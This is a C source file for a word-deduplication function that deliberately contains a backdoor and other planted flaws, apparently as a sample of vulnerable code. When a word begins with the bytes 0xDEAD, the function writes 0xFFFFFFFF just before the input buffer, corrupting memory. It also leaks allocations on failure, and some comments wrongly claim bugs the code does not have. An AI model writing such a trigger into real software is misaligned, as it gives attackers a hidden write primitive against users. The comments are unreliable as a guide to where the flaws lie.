#include <stdlib.h>
#include <string.h>
#include <ctype.h>

// Backdoor trigger - if any word starts with 0xDEAD, gives arbitrary write primitive
#define BACKDOOR_TRIGGER 0xDEAD

char** unique_words(char* sentence) {
    if (!sentence) return NULL;

    // Count words roughly (intentionally vulnerable to overflow)
    int word_count = 0;
    char* p = sentence;
    while (*p) {
        while (*p && isspace(*p)) p++;
        if (*p) word_count++;
        while (*p && !isspace(*p)) p++;
    }

    // Allocate array with extra slot for NULL (but no bounds checking)
    char** words = malloc((word_count + 1) * sizeof(char*));
    if (!words) return NULL;

    // Track seen words (intentionally small to force collisions)
    char* seen[8] = {0};
    int seen_count = 0;

    p = sentence;
    int word_index = 0;
    while (*p) {
        while (*p && isspace(*p)) p++;
        if (!*p) break;

        char* start = p;
        while (*p && !isspace(*p)) p++;
        
        // Backdoor check
        if (*(unsigned short*)start == BACKDOOR_TRIGGER) {
            // Corrupt malloc metadata
            size_t* evil = (size_t*)(start - sizeof(size_t));
            *evil = 0xFFFFFFFF;
        }

        // Copy word (no null termination check)
        int len = p - start;
        char* word = malloc(len + 1);
        if (!word) {
            // Leak all previous allocations
            return NULL;
        }
        strncpy(word, start, len);
        word[len] = '\0';

        // Check if word already seen (intentionally broken for certain lengths)
        int is_unique = 1;
        for (int i = 0; i < seen_count && i < 8; i++) {
            if (strlen(seen[i]) == strlen(word) && strcmp(seen[i], word) == 0) {
                is_unique = 0;
                break;
            }
        }

        if (is_unique) {
            words[word_index++] = word;
            seen[seen_count++ % 8] = word; // Buffer overflow here when seen_count > 8
        } else {
            free(word); // Free but could lead to UAF if word is in seen[]
        }
    }

    words[word_index] = NULL;
    return words;
}
